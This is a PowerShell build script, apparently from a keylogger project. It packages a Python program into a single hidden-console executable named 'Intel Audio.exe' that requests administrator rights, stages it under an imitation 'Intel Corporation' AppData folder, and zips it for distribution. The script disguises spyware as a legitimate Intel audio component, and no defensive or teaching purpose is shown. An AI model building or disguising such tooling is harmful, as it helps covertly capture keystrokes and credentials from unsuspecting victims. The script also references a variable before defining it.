$venvScript  = "$ProjectPath\env\bin\activate.ps1"
$ProjectPath = "$env:USERPROFILE\hack\mailtrap-keylogger\dist"
$ProjectFile = "$ProjectPath\Intel Audio.exe"
$ProjectZip  = "$ProjectPath\Intel Audio.zip"

$DistPath    = "$env:USERPROFILE\AppData\Intel Corporation\Intel Audio"
$DistFile    = "$DistPath\Intel Audio.exe"
$DistZip     = "$DistPath\Intel Audio.zip"


pyinstaller --clean --onefile --nowindowed --noconsole --hide-console hide-early -i .\icon.ico --uac-admin --disable-windowed-traceback --runtime-tmpdir $DistPath '.\Intel Audio.py'
if (-Not (Test-Path $ProjectZip)) {`
    Compress-Archive -Path $ProjectFile -DestinationPath $ProjectZip
    Write-Output "Dist zip created"
} else {
    Remove-Item -Force -Path $ProjectZip
    Write-Output "Dist zip removed"`
    Compress-Archive -Path $ProjectFile -DestinationPath $ProjectZip
    Write-Output "Dist zip created"
}
